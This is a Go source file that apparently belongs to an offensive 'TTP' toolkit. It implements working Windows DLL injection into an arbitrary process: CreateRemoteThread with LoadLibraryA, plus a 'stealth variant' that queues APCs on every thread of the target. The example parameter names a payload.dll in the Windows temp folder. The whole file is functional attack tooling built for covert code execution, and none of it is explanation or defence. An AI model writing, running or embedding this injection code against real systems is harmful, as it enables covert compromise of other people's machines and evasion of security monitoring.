package ttp

// inject_dll.go -- TTP 50: DLL injection (userland, no driver required)
//
// Technique: CreateRemoteThread + LoadLibraryA
//   1. OpenProcess(PROCESS_ALL_ACCESS, pid)
//   2. VirtualAllocEx(process, 0, len(path), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
//   3. WriteProcessMemory(process, remoteAddr, pathBytes, len)
//   4. GetProcAddress(kernel32, "LoadLibraryA")
//   5. CreateRemoteThread(process, nil, 0, LoadLibraryA, remoteAddr, 0, nil)
//   6. WaitForSingleObject(thread, 5000ms)
//   7. VirtualFreeEx + CloseHandle
//
// Stealth variant: APC injection via QueueUserAPC instead of CreateRemoteThread.
// Use "apc" suffix in params to select it.
//
// params: "pid dllpath" | "pid dllpath apc"
// Example: "1234 C:\Windows\Temp\payload.dll"

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

var (
	procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx        = kernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory    = kernel32.NewProc("ReadProcessMemory")
	procCreateRemoteThread   = kernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC         = kernel32.NewProc("QueueUserAPC")
	procGetProcAddress   = kernel32.NewProc("GetProcAddress")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	procWaitForSingleObject  = kernel32.NewProc("WaitForSingleObject")
	procOpenProcess          = kernel32.NewProc("OpenProcess")
	procOpenThread           = kernel32.NewProc("OpenThread")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First        = kernel32.NewProc("Thread32First")
	procThread32Next         = kernel32.NewProc("Thread32Next")
)

const (
	processAllAccess = 0x1F0FFF
	memCommitReserve = 0x3000
	pageReadWrite    = 0x04
	// pageExecuteReadWrite = 0x40 -- declared in bypass.go
	memRelease       = 0x8000
	threadAllAccess  = 0x1F03FF
	th32csSnapThread = 0x00000004
)

// InjectDLL injects a DLL into the target process.
// params: "pid dllpath" | "pid dllpath apc"
func InjectDLL(params string) (string, error) {
	parts := strings.Fields(params)
	if len(parts) < 2 {
		return "", fmt.Errorf("params: pid dllpath [apc]")
	}

	pidN, err := strconv.ParseUint(parts[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid pid: %s", parts[0])
	}
	dllPath := parts[1]
	useAPC := len(parts) >= 3 && strings.ToLower(parts[2]) == "apc"

	// Verify DLL exists
	if _, err := os.Stat(dllPath); err != nil {
		return "", fmt.Errorf("dll not found: %s", dllPath)
	}

	pid := uint32(pidN)

	if useAPC {
		return injectDLLAPC(pid, dllPath)
	}
	return injectDLLThread(pid, dllPath)
}

// injectDLLThread uses CreateRemoteThread + LoadLibraryA.
func injectDLLThread(pid uint32, dllPath string) (string, error) {
	// Open target process
	hProc, _, err := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if hProc == 0 {
		return "", fmt.Errorf("OpenProcess pid %d: %w", pid, err)
	}
	defer procCloseHandle.Call(hProc)

	// Allocate memory in target for DLL path
	pathBuf := append([]byte(dllPath), 0) // NUL-terminated
	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProc, 0, uintptr(len(pathBuf)),
		memCommitReserve, pageReadWrite,
	)
	if remoteAddr == 0 {
		return "", fmt.Errorf("VirtualAllocEx: %w", err)
	}
	defer procVirtualFreeEx.Call(hProc, remoteAddr, 0, memRelease)

	// Write DLL path
	var written uintptr
	r, _, err := procWriteProcessMemory.Call(
		hProc, remoteAddr,
		uintptr(unsafe.Pointer(&pathBuf[0])),
		uintptr(len(pathBuf)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		return "", fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Get LoadLibraryA address (same across processes on same system)
	k32name := append([]byte("kernel32.dll"), 0)
	hK32, _, _ := procGetModuleHandleA.Call(uintptr(unsafe.Pointer(&k32name[0])))
	if hK32 == 0 {
		return "", fmt.Errorf("GetModuleHandle kernel32.dll failed")
	}
	fnName := append([]byte("LoadLibraryA"), 0)
	loadLib, _, err := procGetProcAddress.Call(hK32, uintptr(unsafe.Pointer(&fnName[0])))
	if loadLib == 0 {
		return "", fmt.Errorf("GetProcAddress LoadLibraryA: %w", err)
	}

	// Create remote thread at LoadLibraryA with DLL path as argument
	hThread, _, err := procCreateRemoteThread.Call(
		hProc, 0, 0,
		loadLib, remoteAddr,
		0, 0,
	)
	if hThread == 0 {
		return "", fmt.Errorf("CreateRemoteThread: %w", err)
	}
	defer procCloseHandle.Call(hThread)

	// Wait for thread completion (5 seconds)
	procWaitForSingleObject.Call(hThread, 5000)

	return fmt.Sprintf("[inject:dll] %s injected into pid %d via thread", dllPath, pid), nil
}

// injectDLLAPC uses QueueUserAPC to inject via an alertable thread.
// More stealthy -- no new thread creation.
func injectDLLAPC(pid uint32, dllPath string) (string, error) {
	// Open target process
	hProc, _, err := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if hProc == 0 {
		return "", fmt.Errorf("OpenProcess pid %d: %w", pid, err)
	}
	defer procCloseHandle.Call(hProc)

	// Allocate memory for DLL path
	pathBuf := append([]byte(dllPath), 0)
	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProc, 0, uintptr(len(pathBuf)),
		memCommitReserve, pageReadWrite,
	)
	if remoteAddr == 0 {
		return "", fmt.Errorf("VirtualAllocEx: %w", err)
	}

	var written uintptr
	r, _, err := procWriteProcessMemory.Call(
		hProc, remoteAddr,
		uintptr(unsafe.Pointer(&pathBuf[0])),
		uintptr(len(pathBuf)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, memRelease)
		return "", fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Get LoadLibraryA address
	k32name := append([]byte("kernel32.dll"), 0)
	hK32, _, _ := procGetModuleHandleA.Call(uintptr(unsafe.Pointer(&k32name[0])))
	fnName := append([]byte("LoadLibraryA"), 0)
	loadLib, _, err := procGetProcAddress.Call(hK32, uintptr(unsafe.Pointer(&fnName[0])))
	if loadLib == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, memRelease)
		return "", fmt.Errorf("GetProcAddress LoadLibraryA: %w", err)
	}

	// Queue APC on every thread in the target process
	tids, err := getProcessThreads(pid)
	if err != nil || len(tids) == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, memRelease)
		return "", fmt.Errorf("enumerate threads of pid %d: %v", pid, err)
	}

	queued := 0
	for _, tid := range tids {
		hThread, _, _ := procOpenThread.Call(threadAllAccess, 0, uintptr(tid))
		if hThread == 0 {
			continue
		}
		r, _, _ := procQueueUserAPC.Call(loadLib, hThread, remoteAddr)
		if r != 0 {
			queued++
		}
		procCloseHandle.Call(hThread)
	}

	if queued == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, memRelease)
		return "", fmt.Errorf("QueueUserAPC: no threads queued (target may have no alertable threads)")
	}

	return fmt.Sprintf("[inject:dll:apc] %s queued on %d threads of pid %d", dllPath, queued, pid), nil
}

// THREADENTRY32 layout for Toolhelp32 (used by getProcessThreads).
type threadEntry32 struct {
	dwSize             uint32
	cntUsage           uint32
	th32ThreadID       uint32
	th32OwnerProcessID uint32
	tpBasePri          int32
	tpDeltaPri         int32
	dwFlags            uint32
}

// getProcessThreads returns all thread IDs belonging to a process via Toolhelp32.
func getProcessThreads(pid uint32) ([]uint32, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(th32csSnapThread, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer procCloseHandle.Call(snap)

	var entry threadEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return nil, nil
	}

	var tids []uint32
	for {
		if entry.th32OwnerProcessID == pid {
			tids = append(tids, entry.th32ThreadID)
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return tids, nil
}
